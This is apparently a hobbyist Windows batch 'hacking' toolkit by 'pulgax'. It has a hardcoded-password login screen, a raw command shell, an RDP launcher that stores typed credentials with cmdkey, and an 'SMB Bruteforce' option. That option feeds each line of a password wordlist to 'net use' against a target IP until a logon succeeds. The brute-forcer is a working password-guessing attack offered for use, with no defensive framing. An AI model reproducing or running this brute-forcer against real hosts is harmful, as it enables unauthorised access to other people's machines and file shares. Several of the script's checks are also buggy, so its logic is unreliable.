@echo off
chcp 65001>nul
goto verify
pause
:verify  
echo                                                       [92mverify   
echo                               [96mtype the pass.IF U DONT HAVE A PASS TALK TO AN ADMIN
set /p pass=.%BS%                                       ╚══»
if /I %pass% EQU A1b2C3d4E5f6 goto succesverify
if /I %pass% EQU 7G8h9I0jK1l2 goto succesverify
if /I %pass% EQU M3n4O5p6Q7r8 goto succesverify
if /I %pass% EQU S9t0U1v2W3x4 goto succesverify
if /I %pass% EQU Y5z6A7b8C9d0 goto succesverify
if /i not %pass%== Y5z6A7b8C9d0,S9t0U1v2W3x4,M3n4O5p6Q7r8,7G8h9I0jK1l2,A1b2C3d4E5f6 EXIT
pause
:succesverify
cls
echo [92mcorrect pass
echo [96mloading[[34m------[96m]
ping localhost -n 2 >nul
cls
echo [92mcorrect pass
echo [96mloading[[34m=[34m-----[96m]
ping localhost -n 2 >nul
cls
echo [92mcorrect pass
echo [96mloading[[34m==[34m----[96m]
ping localhost -n 2 >nul
cls
echo [92mcorrect pass
echo [96mloading[[34m==[94m=[34m---[96m]
ping localhost -n 2 >nul
cls
echo [92mcorrect pass
echo [96mloading[[34m==[94m==[34m--[96m]
ping localhost -n 2 >nul
cls
echo [92mcorrect pass
echo [96mloading[[34m==[94m==[96m=-]
ping localhost -n 2 >nul
cls
echo [92mcorrect pass
echo [96mloading[[34m==[94m==[96m==]
ping localhost -n 2 >nul
pause
goto menu
:menu
cls
echo.
echo.
echo       	                                        [38;2;255;255;0mmade by pulgax
echo                                    [38;2;255;0;0m███░ ██  ▄▄▄        ██████  ██░ ██ ▒██   ██▒
echo                                    [38;2;255;51;0m▓██░ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒▒▒ █ █ ▒░
echo                                    [38;2;255;51;0m▒██▀▀██░▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░░░  █   ░
echo                                    [38;2;255;102;0m░▓█ ░██ ░██▄▄▄▄██   ▒   ██▒░▓█ ░██  ░ █ █ ▒ 
echo                                    [38;2;255;102;0m░▓█▒░██▓ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓▒██▒ ▒██▒
echo                                    [38;2;255;153;0m▒ ░░▒░▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒▒▒ ░ ░▓ ░
echo                                    [38;2;255;204;0m▒ ░▒░ ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░░░   ░▒ ░
echo                                    [38;2;255;255;0m░  ░░ ░  ░   ▒   ░  ░  ░   ░  ░░ ░ ░    ░  
echo                                    [38;2;255;255;0m ░  ░  ░      ░  ░      ░   ░  ░  ░ ░    ░  
echo. [38;2;255;0;0m
echo                                         type /commands or type a command
set /p imput=.%BS%                                       ╚══»
if /I %imput% EQU /commands goto commands
if /I %imput% EQU 1 goto commands
if /I %imput% EQU 0 goto exit
if /I %imput% EQU 2 goto CMD
if /I %imput% EQU 3 goto RPC
if /I %imput% EQU 4 goto bruteforce
if /i not %pass%== 1,0,2,3,4,/commands goto menu


:commands
cls
echo.
echo.
echo       	                                        [38;2;255;255;0mmade by pulgax
echo                                    [38;2;255;0;0m███░ ██  ▄▄▄        ██████  ██░ ██ ▒██   ██▒
echo                                    [38;2;255;51;0m▓██░ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒▒▒ █ █ ▒░
echo                                    [38;2;255;51;0m▒██▀▀██░▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░░░  █   ░
echo                                    [38;2;255;102;0m░▓█ ░██ ░██▄▄▄▄██   ▒   ██▒░▓█ ░██  ░ █ █ ▒ 
echo                                    [38;2;255;102;0m░▓█▒░██▓ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓▒██▒ ▒██▒
echo                                    [38;2;255;153;0m▒ ░░▒░▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒▒▒ ░ ░▓ ░
echo                                    [38;2;255;204;0m▒ ░▒░ ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░░░   ░▒ ░
echo                                    [38;2;255;255;0m░  ░░ ░  ░   ▒   ░  ░  ░   ░  ░░ ░ ░    ░  
echo                                    [38;2;255;255;0m ░  ░  ░      ░  ░      ░   ░  ░  ░ ░    ░  
echo. [38;2;255;0;0m
echo                                               ╔commands
echo                                               ║
echo                                               ╚╗
echo                                             (0)╬ EXIT
echo                                             (1)╬ test
echo                                             (2)╬ BEST CMD
echo                                             (3)╬ REMOTE CONTROL PC
echo                                             (4)╬ BRUTEFORCE
echo.
echo                                               type a command number(0,1,2,3...)
set /p imput=.%BS%                                            ╚══»
if /I %imput% EQU 0 goto exit
if /I %imput% EQU 1 goto test
if /I %imput% EQU 2 goto CMD
if /I %imput% EQU 3 goto RPC
if /I %imput% EQU 4 goto bruteforce
if /i not %pass%== 2,1,0,3,4 goto commands
pause
:test
cls
curl parrot.live
pause>nul

:CMD
cls
title CMD made by pulgax
echo.
echo.
echo.
echo                                    [34m███░ ██  ▄▄▄        ██████  ██░ ██ ▒██   ██▒[0m
echo                                    [34m▓██░ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒▒▒ █ █ ▒░[0m
echo                                    [34m▒██▀▀██░▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░░░  █   ░[0m
echo                                    [94m░▓█ ░██ ░██▄▄▄▄██   ▒   ██▒░▓█ ░██  ░ █ █ ▒ [0m
echo                                    [94m░▓█▒░██▓ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓▒██▒ ▒██▒[0m
echo                                    [94m▒ ░░▒░▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒▒▒ ░ ░▓ ░ [0m
echo                                    [96m▒ ░▒░ ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░░░   ░▒ ░ [0m
echo                                    [96m░  ░░ ░  ░   ▒   ░  ░  ░   ░  ░░ ░ ░    ░   [0m
echo                                    [96m ░  ░  ░      ░  ░      ░   ░  ░  ░ ░    ░  [0m
echo.
echo.
echo.
for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
:inputcmd
echo.
echo  [97m╔══[0m([92m%username%[0m@[95m%computername%[0m)-[[91m%cd%[0m]
set /p cmd=".%BS% [97m╚══>[0m "
echo.
%cmd%
goto inputcmd
exit

:RPC
cls
title RemotePC made by pulgax
echo.
echo.
echo.
echo                                    [34m███░ ██  ▄▄▄        ██████  ██░ ██ ▒██   ██▒[0m
echo                                    [34m▓██░ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒▒▒ █ █ ▒░[0m
echo                                    [34m▒██▀▀██░▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░░░  █   ░[0m
echo                                    [94m░▓█ ░██ ░██▄▄▄▄██   ▒   ██▒░▓█ ░██  ░ █ █ ▒ [0m
echo                                    [94m░▓█▒░██▓ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓▒██▒ ▒██▒[0m
echo                                    [94m▒ ░░▒░▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒▒▒ ░ ░▓ ░ [0m
echo                                    [96m▒ ░▒░ ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░░░   ░▒ ░ [0m
echo                                    [96m░  ░░ ░  ░   ▒   ░  ░  ░   ░  ░░ ░ ░    ░   [0m
echo                                    [96m ░  ░  ░      ░  ░      ░   ░  ░  ░ ░    ░  [0m
echo.
echo.
set /p host=.%BS%                                         host══»
set /p user=.%BS%                                         user══»
set /p pass=.%BS%                                         pass══»
cmdkey /add:%host% /user:%user% /pass:%pass% >nul
mstsc v:%host%
cmdkey /delete:%host% >nul
pause 
exit

:bruteforce
cls
title SMB Bruteforce
echo.
echo.
echo.
echo                                    [34m███░ ██  ▄▄▄        ██████  ██░ ██ ▒██   ██▒[0m
echo                                    [34m▓██░ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒▒▒ █ █ ▒░[0m
echo                                    [34m▒██▀▀██░▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░░░  █   ░[0m
echo                                    [94m░▓█ ░██ ░██▄▄▄▄██   ▒   ██▒░▓█ ░██  ░ █ █ ▒ [0m
echo                                    [94m░▓█▒░██▓ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓▒██▒ ▒██▒[0m
echo                                    [94m▒ ░░▒░▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒▒▒ ░ ░▓ ░ [0m
echo                                    [96m▒ ░▒░ ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░░░   ░▒ ░ [0m
echo                                    [96m░  ░░ ░  ░   ▒   ░  ░  ░   ░  ░░ ░ ░    ░   [0m
echo                                    [96m ░  ░  ░      ░  ░      ░   ░  ░  ░ ░    ░  [0m
echo.
echo.
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found :(
pause
exit

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success













:exit
echo Are you sure? (Y/N)
set /p imput=%BS%                                            ╚══»
if /I %imput% EQU Y goto YEXIT
if /I %imput% EQU N goto :menu
pause

:YEXIT
exit
